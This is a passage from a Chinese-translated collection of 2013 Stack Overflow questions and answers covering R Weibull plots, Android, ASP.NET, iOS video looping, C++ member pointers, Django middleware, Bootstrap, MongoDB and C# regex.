        echo '<option value="', $selectContent['id'], '" selected="selected">', $selectContent['name'], '</option>';
    else if($_POST['id' = $selectedContent['id'])
        echo '<option value="', $selectContent['id'], '">', $selectContent['name'], '</option>';
?> 
```

在选择框中预先选择答案的正确方法是使用**selected="selected"**

# r - 如何使用任何变换来缩放/变换 graphics::plot() 轴，而不仅仅是对数（对于 Weibull 图）？

> ID：15879050
> 
> 赞同：14
> 
> 时间：2013-04-08T12:29:37.633
> 
> 标签：r, plot, ggplot2, weibull

我正在构建一个 R 包以在 R 中显示 Weibull 图（使用`graphics::plot`）。该图具有对数变换的*x*轴和 Weibull 变换的*y*轴（因为缺乏更好的描述）。因此，两参数 Weibull 分布可以在该图上表示为一条直线。

*x*轴的对数变换就像将`log="x"`参数添加到`plot()`or一样简单`curve()`。如何以优雅的方式提供*y*轴转换，以便所有与图形相关的绘图都可以在我的轴转换图上工作？为了演示我需要什么，运行以下示例代码：

```
## initialisation ##
beta     <- 2;eta <- 1000
ticks    <- c(seq(0.01,0.09,0.01),(1:9)/10,seq(0.91,0.99,0.01))
F0inv    <- function (p) log(qweibull(p, 1, 1))
    # this is the transformation function
F0       <- function (q) exp(-exp(q))
    # this is the inverse of the transformation function
weibull  <- function(x)pweibull(x,beta,eta)
    # the curve of this function represents the weibull distribution 
    # as a straight line on weibull paper
weibull2 <- function(x)F0inv(weibull(x)) 
```

首先是一个威布尔分布的例子，它带有`beta=2`一个`eta=1000`规则的、未转换的图：

```
## untransformed axes ##
curve(weibull ,xlim=c(100,1e4),ylim=c(0.01,0.99))
abline(h=ticks,col="lightgray") 
```

> ![情节1](https://i.stack.imgur.com/SzEVQ.png)

该图对 Weibull 分析毫无用处。这是我当前实现的解决方案，它使用函数转换数据`F0inv()`并修改绘图的*y*轴。请注意，我必须`F0inv()`在所有*y*轴相关数据上使用。

```
## transformed axis with F0inv() ##
curve(weibull2,xlim=c(100,1e4),ylim=F0inv(c(0.01,0.99)),log="x",axes=F)
axis(1);axis(2,at=F0inv(ticks),labels=ticks)
abline(h=F0inv(ticks),col="lightgray") 
```

> ![情节2](https://i.stack.imgur.com/YANtA.png)

这可行，但这不是很用户友好：当用户想要添加注释时，必须始终使用`F0inv()`：

```
text(300,F0inv(0.4),"at 40%") 
```

我发现您可以使用`ggplot2`和缩放来解决我的问题，但除非绝对必要，否则我不想更改为图形包，因为需要重写许多其他代码。

```
## with ggplot2 and scales ##
library(ggplot2)
library(scales)
weibull_trans <- function()trans_new("weibull", F0inv, F0)
qplot(c(100,1e4),xlim=c(100,1e4),ylim=c(0.01,0.99),
    stat="function",geom="line",fun=weibull) + 
    coord_trans(x="log10",y = "weibull") 
```

> ![情节3](https://i.stack.imgur.com/eyB8S.png)

我认为如果我可以用我自己的动态替换应用对数变换的代码，我的问题就会得到解决。

我试图通过谷歌搜索“R 轴变换”、“R 用户坐标”、“R 轴缩放”来查找更多信息，但没有有用的结果。我发现的几乎所有东西都涉及对数刻度。

我试图研究`plot()`参数的`log="x"`工作原理，但相关代码`plot.window`是用 C 编写的——这根本不是我的强项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-12T02:25:19.360

虽然在基本图形中似乎不可能，但您可以使此函数做您想做的事情，以便您可以更简单地调用它：

```
F0inv    <- function (p) log(qweibull(p, 1, 1))
## this is the transformation function
F0       <- function (q) exp(-exp(q))

weibullplot <- function(eta, beta,
                        ticks=c(seq(0.01,0.09,0.01),(1:9)/10,seq(0.91,0.99,0.01)),
                        ...) {
  ## the curve of this function represents the weibull distribution 
  ## as a straight line on weibull paper
  weibull2 <- function(x)
    F0inv(pweibull(x, beta, eta))
  curve(weibull2, xlim=c(100, 1e4), ylim=F0inv(c(0.01, 0.99)), log="x", axes=FALSE)
  axis(1);
  axis(2, at=F0inv(ticks), labels=ticks)
  abline(h=F0inv(ticks),col="lightgray")
}

weibullplot(eta=1000, beta=2) 
```

# android - Android：运行线程一段时间

> ID：15879054
> 
> 赞同：0
> 
> 时间：2013-04-08T12:29:53.700
> 
> 标签：android, multithreading, time, runnable, terminate

在我的应用程序中，我正在调用 API 以获取一些 JSON。有时当人们在 2g 网络上或他们的网络掉线时，等待时间会变得很长（尤其是当你显示一个对话框时），因此我想在 45 秒后终止线程。

我在 SO 上搜索并找到了这个线程：[Running a thread for some seconds](https://stackoverflow.com/questions/10136494/running-a-thread-for-some-seconds)。

这是最好的方法吗？

我的代码格式如下：

```
new Thread(new Runnable() {
                public void run() {
                     //i.e.
                    fetchJSON();
                }
            }).start(); 
```

干杯!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:41:38.210

为此，您实际上需要使用 HTTP 的 connection_timeout 功能让您的网络调用在一段时间后自动终止。例如：

```
final int CONNECTION_TIME_OUT = 45;     //in seconds

HttpParams httpPar = new BasicHttpParams();
HttpConnectionParams.setConnectionTimeout(httpPar, CONNECTION_TIME_OUT * 1000);
HttpConnectionParams.setSoTimeout(httpPar, CONNECTION_TIME_OUT * 1000);
HttpClient client = new DefaultHttpClient(httpPar); 
```

这样，`client`如果完成请求的时间超过 45 秒，您将自动终止 http 连接。

# c# - .ashx 处理程序中的上一页

> ID：15879055
> 
> 赞同：1
> 
> 时间：2013-04-08T12:29:55.153
> 
> 标签：c#, asp.net, httphandler, ashx

是否可以`Page.PreviousPage`在通用 .ashx 处理程序中检索 .aspx 页面的跨页面 PostBack 的等价物？

我需要从执行 PostBack 的页面访问一些 POST 值，并且 - 虽然我可以简单地使用`Request.Form`- 有问题的值来自 WebControls，因此，它们的名称相当模糊（而且不是很健壮）（例如 ctl00$WebFormsContent$SomeControl $SomeOtherControl$txtWhatever）。

我尝试了以下方法：

```
public void ProcessRequest(HttpContext context)
{
    Page previous = context.PreviousHandler as Page;
    if (previous != null)
        context.Response.Redirect("http://www.google.com");
} 
```

但是，这不起作用 - 在调试时，我可以看到它`context.PreviousPage`是空的。

有没有办法检索此信息并将其转换为`Page`?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:48:02.053

这里`PreviousHandler`不会帮助你。要让您的 HttpHandler 接收跨页 PostBack，您必须了解它的底层工作原理。

参考：[将用户重定向到另一个页面](http://msdn.microsoft.com/en-IN/library/x3x8t37x.aspx)

> 跨页发布类似于超链接，因为传输是由用户操作发起的。但是，在跨页面发布中，目标页面是使用 HTTP POST 命令调用的，该命令将源页面上的控件值发送到目标页面。此外，如果源页面和目标页面在同一个 Web 应用程序中，则目标页面可以访问源页面的公共属性。与往常一样，应用程序中的所有页面都可以共享存储在会话状态或应用程序状态中的信息。

阅读该位后会清楚，您要查找的所有值实际上都作为 POST 变量发送到您的处理程序。

您可以在`context.Request.Params`集合中找到它们。

现在您已经收到了来自页面的请求，让我们在处理程序中说 Page1.aspx；我们需要创建一个可以处理和处理这个请求的对象。这是您的 Page1 对象的一个​​实例。

```
string pagePath = "~/Page1.aspx";                   //virtual path to your page
Type type = BuildManager.GetCompiledType(pagePath); //find the type

//create an object of your page
Page myPage = (Page)Activator.CreateInstance(type); 
myPage.ProcessRequest(HttpContext.Current);         //process the request 
```

使用对象处理当前请求后，您会发现 Controls 集合已填充并填充了输入数据。您现在可以使用公开的属性或`FindControl`查找必要的控件并从中获取输入。

# iphone - 如何在 iphone 中连续播放视频？

> ID：15879068
> 
> 赞同：1
> 
> 时间：2013-04-08T12:30:39.967
> 
> 标签：iphone, objective-c, ipad, cocoa-touch

我正在使用 MPMoviePlayerController 但我遇到的问题是它只重复两次但我必须不断重复它如何做到这一点请任何人建议我更好的方法。

```
-(void)viewDidLoad
{
    player = [[MPMoviePlayerController alloc] initWithContentURL:outPutUrl];

    player.view.frame = CGRectMake(0, 0, 320, 480);
    player.repeatMode = MPMovieRepeatModeOne;

    [player setShouldAutoplay:YES];
    [player prepareToPlay];

    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(moviePlayerDidFinish:)
                                                 name:MPMoviePlayerPlaybackDidFinishNotification
                                               object:player];
    [player setControlStyle:MPMovieControlStyleNone];

    [self.imgView addSubview:player.view];

    [player play];
}
-(void)moviePlayerDidFinish:(NSNotification *)note
{
    if (note.object == player)
    {
        NSLog(@"this is note%@",note.object);

        NSInteger reason = [[note.userInfo objectForKey:MPMoviePlayerPlaybackDidFinishReasonUserInfoKey] integerValue];

        if (reason == MPMovieFinishReasonPlaybackEnded)
        {
            [player play];
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:23:50.523

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    player = [[MPMoviePlayerController alloc] initWithContentURL:[NSURL fileURLWithPath:[[NSBundle mainBundle] pathForResource:@"drvo_hd_final-1" ofType:@"mp4"]]];
    player.view.frame = CGRectMake(20, 20, 280, 200);
    player.repeatMode = MPMovieRepeatModeOne;
    [player setShouldAutoplay:YES];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(moviePlayerDidFinish:)  name:MPMoviePlayerPlaybackDidFinishNotification object:player];
    [player setControlStyle:MPMovieControlModeDefault];
    [self.view addSubview:player.view];
    [player prepareToPlay];
}

- (void)moviePlayerDidFinish:(NSNotification *)note
{
    if (note.object == player)
    {
        NSLog(@"this is note%@",note.object);
        NSInteger reason = [[note.userInfo objectForKey:MPMoviePlayerPlaybackDidFinishReasonUserInfoKey] integerValue];
        if (reason == MPMovieFinishReasonPlaybackEnded)
        {
            [player prepareToPlay];
        }
    }
} 
```

**这对我有用并不断播放......**

# c++ - C++：指向复合类数据成员的指针

> ID：15879071
> 
> 赞同：0
> 
> 时间：2013-04-08T12:30:56.893
> 
> 标签：c++, pointers, member

是否可以使用指向成员的指针访问复合类数据成员？以下代码无效，但演示了需要。

例如：

```
class A
{
public:
    float fA;
};

class B
{
public:
    float fB;
    A a;
};

void test()
{
    // Use of member pointer to access B::fB member
    float B::*ptr = &B::fB; // -> OK
    B myB;
    myB.*ptr = 25.;

    // Use of member pointer to access B::a.fA member ???
    float B::*ptr2 = &B::a.fA; // -> ERROR
    B myB.*ptr2 = 25.;
} 
```

我在这里完成了我的问题：[指向复合类数据成员的指针 - 第 2 部分](https://stackoverflow.com/questions/15881735/pointer-to-composite-class-data-member-part-2)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:56:40.467

这是一些看起来很奇怪的语法，但如果我理解正确，您正试图通过 B 类访问 fA。如果是这种情况，那么您将需要在 A 类可供访问之前创建 B 类的实例。基本上，如果 B 不存在，您将无法访问其中的内容。错误就是它听起来的样子，“.fA 的左侧必须有一个类/结构/联合”，这意味着您的编译器无法确定 fA 的左侧是什么，因此“a”未定义或不存在. 此外，您在 B myB 中有一个重新定义错误:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:54:26.787

我同意评论者的观点，也许你应该问如何做*你想做*的事，而不是如何做*你认为会做你想做*的事:)

至于问题：不，您不能`B::a.fA`以这种方式访问​​。但是，您可以执行以下操作：

```
A myA;
float A::*ptr2 = &A::fA; // -> OK now
myB.a.*ptr2 = 25.; 
```

或以下内容：

```
A B::*ptr3 = &B::a; 
(myB.*ptr3).fA = 1.0f;  // -> OK too 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:53:27.857

这里明显的“原因”是因为`fA`不是 `B`. 在这种特殊情况下，实现它可能不会导致任何特定问题，包括正交性规则和成员函数，我认为它无法实现。

当然，您可以做的是获取`A` 成员的地址`B`，然后`fA`通过它来访问：

```
A B::*ptr = &B::a;
(myB.*ptr).fa = 25.; 
```

， 例如。（我不确定是否需要括号。这不是我经常使用的结构，足以让我记住优先级。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T17:29:32.300

不，您不能，因为 C++ 语法不允许这样做。我没有看到您尝试做的事情有什么特别之处，但是在语言中根本没有考虑到它。

但是请注意，指向数据成员的指针是一个对象，给定实例将返回对特定数据成员的引用。您可以手动实现此功能以放宽限制：

```
struct A
{
    double x;
    double y;
    static double& x_of(void *p) { return ((A *)p)->x; }
    static double& y_of(void *p) { return ((A *)p)->y; }
};

struct B
{
    double z;
    A a;
    static double& x_of(void *p) { return ((B *)p)->a.x; }
    static double& y_of(void *p) { return ((B *)p)->a.y; }
    static double& z_of(void *p) { return ((B *)p)->z; }
}; 
```

指针的类型是 just `double& (*)(void *)`，您甚至可以使用这种技巧，例如将数组元素作为成员返回。

# android - dp 真的是设备独立的吗？

> ID：15879077
> 
> 赞同：1
> 
> 时间：2013-04-08T12:31:03.167
> 
> 标签：android, android-layout

这听起来很愚蠢，但我很困惑。我已经定义了一个带有图像条纹的布局。条带高度设置为一些 x dp。但我可以看到不同手机的高度差异（在三星note2中它看起来比nexus 4大）。有人可以解释或提供一些有用的链接吗？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:33:35.597

仅供参考，DP 代表与**密度无关的像素**。

这是屏幕密度的定义：

> **屏幕密度**
> 
> 屏幕物理区域内的像素数量；通常称为 dpi（每英寸点数）。例如，与“正常”或“高”密度屏幕相比，“低”密度屏幕在给定物理区域内的像素较少。

参考：http: [//developer.android.com/guide/practices/screens_support.html](http://developer.android.com/guide/practices/screens_support.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:34:53.480

这些可能会有所帮助：

[Android上的“px”、“dp”、“dip”和“sp”有什么区别？](https://stackoverflow.com/questions/2025282/difference-of-px-dp-dip-and-sp-in-android)

[http://developer.android.com/guide/practices/screens_support.html](http://developer.android.com/guide/practices/screens_support.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:42:30.230

mdpi、hdpi、xhdpi、... 后缀代表**广义**密度。

这意味着 2 部 xhdpi 手机的实际密度可能略有不同。

例如，Galaxy Nexus 和 Galaxy SIII 都标注为 xhdpi，但 Galaxy Nexus 的屏幕为 316ppi，而 Galaxy SIII 的屏幕为 306ppi

来源：[维基百科](http://en.wikipedia.org/wiki/List_of_displays_by_pixel_density#Samsung)

# c# - 在 PCL 中将字符串资源添加到 .resx 会导致编译错误

> ID：15879080
> 
> 赞同：5
> 
> 时间：2013-04-08T12:31:07.180
> 
> 标签：c#, .net, visual-studio, portable-class-library

我的可移植类库中有一个资源文件，目前包含大约 30 个字符串。它们可以从我的 Windows Phone 8 应用程序中访问，并且文件中已经存在的字符串可以正常工作。

但是，现在当我尝试像之前那样添加新字符串时，会导致编译错误：

**“System.Type”不包含“Assembly”的定义，并且找不到接受“System.Type”类型的第一个参数的扩展方法“Assembly”（您是否缺少 using 指令或程序集引用？）**

查看 .designer.cs 文件很明显这是问题所在。添加新字符串时，会发生两个变化：

*   使用 System.Reflection；消失
*   `global::System.Resources.ResourceManager("ViewModels.Resources.StringResources", typeof(StringResources).Assembly); 代替：

    new global::System.Resources.ResourceManager("ViewModels.Resources.StringResources", typeof(StringResources).GetTypeInfo().Assembly);

.GetTypeInfo() 和消失的 using 语句是问题所在，但我无法将它们放回去，因为该文件是由 Visual Studio 生成并变回的。有任何想法吗？

我能想到的唯一重大变化是新的 Visual Studio 2012 更新 2？

**另外值得注意的是：** 如果我在项目的其他任何地方（wp8 应用程序或另一个 pcl）添加另一个 resx，那么在添加字符串时会表现出完全相同的行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T15:15:07.840

目前看来，这是更新 2 后 Visual Studio 中的一个错误。有关更多详细信息，请参见此处：

[https://connect.microsoft.com/VisualStudio/feedback/details/783211/resx-file-unable-to-be-edited-correctly-causes-compilation-error-in-generated-designer-file-after-vs2012- update-2#tabs](https://connect.microsoft.com/VisualStudio/feedback/details/783211/resx-file-unable-to-be-edited-correctly-causes-compilation-error-in-generated-designer-file-after-vs2012-update-2#tabs)

# java - 如何使用 php 获取图像位置并将其发送到小程序？

> ID：15879086
> 
> 赞同：0
> 
> 时间：2013-04-08T12:31:19.493
> 
> 标签：java, php, html, image, applet

我正在创建一个使用 Applets 创建的项目。在我的项目中，我使用小程序为图像创建效果。最初，我只使用与项目文件存储在同一位置的 1 个图像来完成该项目。

我正在使用以下代码调用我的小程序 `<applet code=ImageFilterDemo width=1024 height=480> <param name=img value="<?php echo $file; ?>">` 并传递了图像的名称，在这种情况下是`1.jpg`

我尝试创建一个有助于选择和上传文件的表单：

`<form action="filter.html" method="post" enctype="multipart/form-data"> Select IMAGE : <input type="file" name="image" /> <input type="submit" value="Upload" /> </form>`

然后我尝试使用 php 代码获取图像的文件名

`<?php $file= $_FILES['image']['tmp_name']; ?>`

我不是php专家。我试图看看我犯了什么错误，但仍然无法弄清楚错误是什么。

注意：我希望小程序在选择文件并单击上传时加载图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-17T08:01:51.123

//像这样在你的php文件中加载一个applet

```
<applet code="appletname.class" height=someint width=someint>

    </applet>
and inside applet init() method
        add this line

    String str_loc=getParameter("image_file_location_set_via_php_inside_param_tag");**

    Now using HttpUrlConnection use this location to fetch the image if its over the web 

    else use
       Normal file handling 
```

干杯

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-08T12:42:41.780

W3 学校有一个很好的关于处理文件上传的教程：http: [//www.w3schools.com/php/php_file_upload.asp](http://www.w3schools.com/php/php_file_upload.asp)

您应该将上传的文件保存到一个永久位置，并将该位置用于您的小程序。

此外，文件通常上传到一个临时的、不可通过网络访问的目录，因此当您的小程序按名称请求文件时，由于位于错误的目录中而无法找到它。

# zend-framework2 - 在一页中显示多个表单

> ID：15879090
> 
> 赞同：2
> 
> 时间：2013-04-08T12:31:29.563
> 
> 标签：zend-framework2

一周前刚刚说过 zend2 并且是框架环境的新手。

使用 zend2 教程，我创建了不同的表单，但现在我需要在一页中显示三个表单。

报告/添加公司/添加用户/添加

使用自己的视图文件输出三种不同的形式。但我需要三个一页。

我尝试了很多搜索，但没有找到相关结果。问题可能重复，如果是这样，请放弃参考。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T12:54:32.643

你会感兴趣的[`\Zend\View\Helper\Partial`](http://zf2.readthedocs.org/en/latest/modules/zend.view.helpers.html#partial-helper)。这`ViewHelper`允许您在当前视图文件中呈现不同的视图文件。让我们假设您有某种仪表板可以呈现多个表单的场景。

**form_one.phtml**

```
$form = $this->form;
//render your Form 
```

**form_two.phtml**

```
$form = $this->form;
//render your Form 
```

到目前为止一切顺利，这里没有什么特别的。让我们快速绕道您的`DashboardController`或特定的`dashboardAction()`

```
public function dashboardAction()
{
    $formOne = new FormOne();
    $formTwo = new FormTwo();

    return array(
        'form_one' => $formOne,
        'form_two' => $formTwo
    );
} 
```

通过此设置，变量`form_one`和`form_two`将在您的内部可用`dashboard.phtml`

**仪表板.phtml**

```
<h2>FormOne</h2>
<?=$this->partial('form_one.phtml', array('form' => $this->form_one));?>

<h2>FormTwo</h2>
<?=$this->partial('form_two.phtml', array('form' => $this->form_two));?> 
```

使用此设置，您可以让特定的渲染视图文件知道每个表单，`form`或者使用更少的魔法`$this->form`

# performance - 监控 Azure 网站

> ID：15879096
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:31:51.297
> 
> 标签：performance, azure, cloud, monitoring

我想编写一个程序来显示您在 Azure 管理门户上看到的监控数据。

*   该程序应监控网站而不是存储或网络/工作人员角色
*   Windows Azure API 能否提供对门户上公开的所有数据的访问？

请建议我该如何开始。我应该考虑将网站转换为工人角色吗？

请原谅我这个蹩脚的问题，因为我对 Azure 和云很陌生

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:38:05.530

我不相信 Windows Azure 网站的监控数据此时会公开。也许曾经服务 GA 的？

如果您需要详细的指标（性能计数器），则需要使用网络/工作人员角色。

# iphone - 在 iOS 中使用什么作为下拉列表

> ID：15879098
> 
> 赞同：-3
> 
> 时间：2013-04-08T12:31:59.883
> 
> 标签：iphone, ios, objective-c, rubymotion

我正在玩 RubyMotion 并尝试向示例应用程序添加一个简单的列表。在列表中将有四个项目 ( `say, milk, cheese, beer, water`)，用户应该能够从中挑选（选择）一个。

我可以为此目的使用什么控件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:38:13.800

我想你想要 UIPickerView。

这里有一些教程：

*   [制作 UIPickerView 示例应用的教程](http://klanguedoc.hubpages.com/hub/A-Tutorial-on-Making-a-UIPickerView-Sample-App)
*   [UIPickerView 示例](http://www.roseindia.net/tutorial/iphone/examples/UIPickerView/UIPickerViewExample.html)

# django - 如何为 django 定义一个自定义的 wsgi 中间件

> ID：15879099
> 
> 赞同：3
> 
> 时间：2013-04-08T12:32:17.157
> 
> 标签：django

我想编写一个自定义的 wsgi 中间件，在每个传入的请求上都会调用它。它检查 url，以及用户是否已通过身份验证并允许请求继续或拒绝它。

在 django 中添加 wsgi 中间件的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:35:43.740

为什么你想把它作为一个 WSGI 中间件来做呢？Django 在这些方面运行得不是特别好 - 几年前有一些工作试图将 Django 中间件与 WSGI 中间件协调起来，但它并没有真正取得任何进展。

Django 有自己的中间件版本，[文档非常详细](https://docs.djangoproject.com/en/1.5/topics/http/middleware/)，您的请求可以在大约三行内完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T19:49:50.510

这里不需要 wsgi 中间件，可以轻松使用 django 中间件。

some_app/middleware.py

```
from django.http import HttpResponseForbidden

class AuthenticateMiddleware(object):

    def process_request(self, request):
        #do something with request.path
        if request.user.is_authenticated():
            #can do something or just pass
            #but do not return a response from here
        else:
            #return a response from here so that view doesn't get called
            return HttpResponseForbidden() 
```

`process_request()`在处理之前调用任何中间件`view`。如果您`HttpResponse`从此方法返回一个实例，则不会调用视图。由于`HttpResponseForbidden`是 的子类`HttpResponse`，因此如果用户未通过身份验证，则不会调用视图。

您需要将此自定义中间件添加到 MIDDLEWARE_CLASSES。

设置.py

```
MIDDLEWARE_CLASSES = ( 
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'some_app.middleware.AuthenticationMiddleware',
) 
```

# twitter-bootstrap - 在 Django 模板中连续显示缩略图

> ID：15879100
> 
> 赞同：0
> 
> 时间：2013-04-08T12:32:24.260
> 
> 标签：twitter-bootstrap

我正在使用引导程序的缩略图功能。我动态地显示它们。但我想连续显示四个缩略图。我怎样才能做到这一点？？？这是代码。这会在另一个下方显示缩略图。但我要连续四个。我动态地创建缩略图。我对 Bootstrap 很陌生。

```
 {% for obj in q2 %}

{{q2.count}}
{{forloop.counter}}
        <tr>
            <td>

<div class="row-fluid">
    <div class="span12">
        <!-- <div class="span4"> -->
<ul  class="thumbnails">
  <li class="span4">
<br>
<br>

    <div  class="thumbnail" style="width:425%;margin-left:20px;height:420px" >
      <img  data-src="holder.js/300x200" alt="">
      <p> <b> {{obj.op_title}} </b></p>     
     <p><i class="icon-ok-circle"></i> <span class="label label-success">{{obj.op_status}}</span></p>
          <p><i class=" icon-user"></i> {{obj.op_positions}} Vacancies</p>
          <p><i class=" icon-map-marker"></i> {{obj.op_location}}</p>
<p><i class="icon-tasks icon-blue"></i> {{obj.op_qualification}} </p>
<p> <i class="icon-star icon-blue"></i> {{obj.op_experience}} Years </p>

<p><i class="icon-calendar icon-blue"></i> {{obj.op_effective_from.day}}-{{obj.op_effective_from.month}}-{{obj.op_effective_from.year}} - {{obj.op_effective_to.day}}-{{obj.op_effective_to.month}}-{{obj.op_effective_to.year}} </p>
<div class="accordion" id="accordion2">
  <div class="accordion-group">

     <div class="accordion-heading">
      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#{{obj.op_id}}">
  <i class="icon-book"></i>      Job Description
      </a>
    </div>

    <div id="{{obj.op_id}}" class="accordion-body collapse ">
      <div class="accordion-inner">
     {{obj.op_desc}}
      </div>
    </div>
</div>
 <div class="accordion-group">
    <div class="accordion-heading">

      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#{{obj.op_test_type}}">
       Skills Required
      </a>
    </div>
    <div id="{{obj.op_test_type}}" class="accordion-body collapse">
      <div class="accordion-inner">
       {{obj.op_skill_required}}
      </div>

    </div>

</div>

 <div class="accordion-group">
    <div class="accordion-heading">
      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#{{obj.op_experience}}">
       Skills Preferred
      </a>
    </div>
    <div id="{{obj.op_experience}}" class="accordion-body collapse">
      <div class="accordion-inner">
 {{obj.op_skill_preferred}}
      </div>
    </div>
</div>

<div class="accordion-group">
    <div class="accordion-heading">
      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#{{obj.op_desc}}">
       Selection Criteria
      </a>
    </div>
    <div id="{{obj.op_desc}}" class="accordion-body collapse">
      <div class="accordion-inner">
    {{obj.op_selection_criteria}}
      </div>
    </div>
  </div>
  <br>

  <div>
      <a class="btn btn-primary" href="{% url editRow  obj.op_id  %}">Edit</a>
<a class="btn" onclick="return confirm('Are you sure want to delete this Opening!!!!');"  href="{% url deleteRow  obj.op_id  %}">Delete</a>
</div>
</div>
</div>
</div>
</li>
</ul>
</div>
</div>
</div>

{% endfor %}
</td>
</tr> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:50:36.217

在引导文档[http://twitter.github.io/bootstrap/components.html#thumbnails](http://twitter.github.io/bootstrap/components.html#thumbnails)之后，您可以使用网格列大小显示这样的缩略图`.span3`。

在这里你可以摆弄示例[http://jsfiddle.net/GgSRN/1/](http://jsfiddle.net/GgSRN/1/)

您动态添加的项目应具有如下代码：

```
<li class="span3">
    <a href="#" class="thumbnail">
        <img src="myimg" alt="myimg">
    </a>
</li> 
```

在每四行之后，您必须结束您的列表并开始新的：

```
</ul>
<ul class="thumbnails"> 
```

希望有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:46:59.107

在你的 css 中给图像一个宽度；例子

```
#divname img
{
 width:148px;(the size you want )
 height:120px;
} 
```

现在图像的大小始终为 150x120

然后设置浮动：左；

图像将依次加载。你可以设置

```
#divname img
{
 width:148px;(the size you want )
 height:120px;    
 margin-top:2px;
 margin-right:1px;
 margin-left:1px;
} 
```

所以图像之间有一个小空间。

如果他们所在的 div 为 600 px，则将有 4 张图像。您可以通过 (img incl border 150px) 600/150=4 图像计算

我希望这是您正在寻找的答案，因为问题不是很清楚。

# c# - 动态打开一个doc文件c#

> ID：15879107
> 
> 赞同：0
> 
> 时间：2013-04-08T12:32:43.517
> 
> 标签：c#, web-applications

在过去的几周里，我一直在使用这行代码来动态打开一个 doc 文件，一旦用户创建了它并且它工作正常......

```
System.Diagnostics.Process.Start(@"C:\\Users\\peter\\Desktop\\" + txtEditTitle.Text + ".doc"); 
```

但是今天，由于某种原因，它给了我以下错误：

![今天已经开始出现](https://i.stack.imgur.com/KjUqq.jpg)

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:09:48.130

根据您的屏幕截图，它显示文件不存在。检查文件的路径并确保文件存在：

```
string  strPath = "C:\\Users\\peter\\Desktop\\" + txtEditTitle.Text + ".doc";
// strPath=@"C:\Users\peter\Desktop\" + txtEditTitle.Text + ".doc";
if (File.Exists(strPath))
{
    System.Diagnostics.Process.Start(strPath);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:35:13.967

正如您可以在异常中读取的那样，该文件不存在。在打开文件之前检查[文件是否存在](http://msdn.microsoft.com/en-us/library/system.io.file.exists.aspx)是没有错的。

# java - 如何使用 Java Driver 在 MongoDB 中执行全文搜索命令？

> ID：15879109
> 
> 赞同：6
> 
> 时间：2013-04-08T12:32:46.080
> 
> 标签：java, mongodb, mongo-java

Mongo 和 Java 大师。我们的团队决定使用最近在 MongoDB 中引入的全文搜索 API。但是，我们发现使用 Java MongoDB 驱动程序执行命令存在一些困难。

这是我正在使用的代码：

```
public BasicDBObject find(String search) {
    BasicDBObject searchCommand = new BasicDBObject();

        searchCommand.put("text", new BasicDBObject().append("search", search));

        CommandResult commandResult = db.command(searchCommand);
} 
```

这是我打印时得到的

```
 System.out.println(commandResult) 

{ "serverUsed" : "/127.0.0.1:27017" , "errmsg" : "exception: wrong type for field (text) 3 != 2" , "code" : 13111 , "ok" : 0.0 } 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-08T12:40:33.507

摘自 Google 群组 ( [https://groups.google.com/forum/?fromgroups#!topic/mongodb-user/7jWUbunUcFQ](https://groups.google.com/forum/?fromgroups#!topic/mongodb-user/7jWUbunUcFQ) ) 上的帖子：

```
 final DBObject textSearchCommand = new BasicDBObject();
    textSearchCommand.put("text", collectionName);
    textSearchCommand.put("search", textToSearchFor);
    final CommandResult commandResult = db.command(textSearchCommand); 
```

准确显示如何格式化命令。

# c# - 在 C Sharp 中使用正则表达式替换函数

> ID：15879113
> 
> 赞同：1
> 
> 时间：2013-04-08T12:33:09.130
> 
> 标签：c#, regex

请在某个问题上寻求帮助。

事实上，我得到了一个名为“image”的base64字符串：

```
data:image/pjpeg;base64,iVBORw0KGgoAAAANSUhE... 
```

我需要用“”替换部分“data:image/pjpeg;base64”。

我尝试这种方式：

```
imageSrc = image.Replace("data:image/(png|jpg|gif|jpeg|pjpeg|x-png);base64,", ""); 
```

但它不起作用。

有人对此有想法吗？

非常感谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T12:37:38.810

您应该在 Regex 类上使用静态[Replace方法。](http://msdn.microsoft.com/en-us/library/e7f5w83z.aspx)

```
imageSrc  = Regex.Replace(image, "data:image/(png|jpg|gif|jpeg|pjpeg|x-png);base64,", ""); 
```

* * *

## 回答 #2

